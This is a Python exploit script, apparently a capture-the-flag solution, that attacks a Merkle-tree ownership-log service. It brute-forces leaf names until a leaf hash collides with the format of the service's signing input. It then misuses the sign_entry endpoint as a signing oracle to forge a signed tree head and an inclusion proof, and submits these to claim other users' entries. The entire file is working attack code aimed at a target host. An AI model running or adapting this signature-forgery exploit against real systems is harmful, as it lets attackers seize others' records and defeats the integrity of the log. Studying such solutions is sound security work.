import sys
from hashlib import sha3_256

from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

try:
    from .api import Api, Sth, TreeLeafProof, TreeLeaf
except ImportError:
    from api import Api, Sth, TreeLeafProof, TreeLeaf


def find_indices(api: Api) -> list[int]:
    result = []
    sth = Sth.from_binary(api.get_sth())
    for start in range(max(0, sth.size - 32), sth.size, 16):
        end = min(start + 16, sth.size)
        for i, leaf in enumerate(api.get_entries(start, end), start=start):
            if len(TreeLeaf.from_binary(leaf).data_for_public_claims) > 28:
                result.append(i)
    return result


def fake_signed_proof(api: Api, claimed_proof: bytes, pubkey: bytes) -> bytes:
    parsed_proof = TreeLeafProof.from_binary(claimed_proof)
    parsed_leaf = TreeLeaf.from_binary(parsed_proof.leaf)

    # sot sig input: hash("ownership" + ts + contenthash + "\x07" + name)
    # sth hash/sig:  hash(left hash + right hash)
    # sth left hash: "ownership" + ts + contenthash[:8]  // = arbitrary
    # sth right hash: contenthash[8:] + "\x07" + name    // = leaf hash
    # GOAL: find a leaf so that its hash matches right format
    leaf = TreeLeaf(parsed_leaf.created, parsed_leaf.contenthash, b'', pubkey, b'', b'')
    for i in range(1000000):
        leaf.name = f'rnd{i}'.encode()
        leaf_hash = sha3_256(leaf.to_binary()).digest()
        if leaf_hash[-8] != 7:
            continue
        sot_name = leaf_hash[-7:]
        try:
            sot_name_str = sot_name.decode('ascii')
        except UnicodeDecodeError:
            continue
        if sot_name_str.encode() != sot_name:
            continue
        print('FOUND in attempt', i)
        break
    print('leaf name:', repr(leaf.name))
    print('sot name: ', repr(sot_name_str))
    print('leaf hash:', repr(leaf_hash))

    sot = api.sign_entry({
        'content_hash': b'\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' + leaf_hash[:-8],
        'name': sot_name_str
    })
    left_hash = b'ownership' + sot[:32 - 9]
    right_hash = sot[32 - 9:64 - 9]
    sot_signature = sot[64 - 9:]
    assert len(sot) == 128 - 9
    assert right_hash == leaf_hash
    print('left hash: ', repr(left_hash))
    print('right hash:', repr(right_hash))
    print('leaf hash: ', repr(leaf_hash))

    return TreeLeafProof(
        head=Sth(
            size=2,
            timestamp=parsed_proof.head.timestamp,
            hash=sha3_256(left_hash + right_hash).digest(),
            signature=sot_signature
        ),
        index=1,
        leaf=leaf.to_binary(),
        hashes=[left_hash]
    ).to_binary()


def generate_keypair() -> tuple[ed25519.Ed25519PrivateKey, bytes]:
    privkey = ed25519.Ed25519PrivateKey.generate()
    return privkey, privkey.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)


def exploit(target: str):
    api = Api(target)
    indices = find_indices(api)
    privkey, pubkey = generate_keypair()

    for index in indices[::-1]:
        print(f'\n\n\nAttacking leaf #{index}...')
        claimed_proof = api.get_entry_proof(index)
        faked_proof = fake_signed_proof(api, claimed_proof, pubkey)
        print(api.claim_public(faked_proof, claimed_proof, privkey))


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost')
